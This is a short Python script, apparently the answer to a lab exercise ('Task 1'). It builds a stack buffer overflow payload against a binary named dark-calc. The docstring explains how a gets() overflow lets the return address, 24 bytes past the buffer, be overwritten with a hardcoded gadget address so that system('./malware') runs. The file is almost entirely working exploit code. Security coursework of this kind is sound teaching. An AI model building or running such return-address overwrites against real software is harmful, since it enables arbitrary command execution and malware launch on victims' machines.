#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Exploit the gets() overflow in input() to run system("./malware").

input() copies our expression into the global command_buf via
    strcpy(command_buf, expression)
so we put "./malware" followed by a NUL there.  The overflow then
overwrites input()'s return address (24 bytes past the buffer) with the
address of eval()'s `mov edi, 0x6030d0 ; call system@plt` sequence
(0x401a6b), which skips the command-rebuilding code and directly executes
system(command_buf) == system("./malware").
"""
import struct
import sys

command_buf_call_system = 0x401A6B  # mov edi, 0x6030d0 ; call system@plt
offset_to_ret = 24

payload = b"./malware\x00" + b"A" * (offset_to_ret - len(b"./malware\x00")) \
    + struct.pack("<Q", command_buf_call_system)

sys.stdout.buffer.write(payload + b"\n")
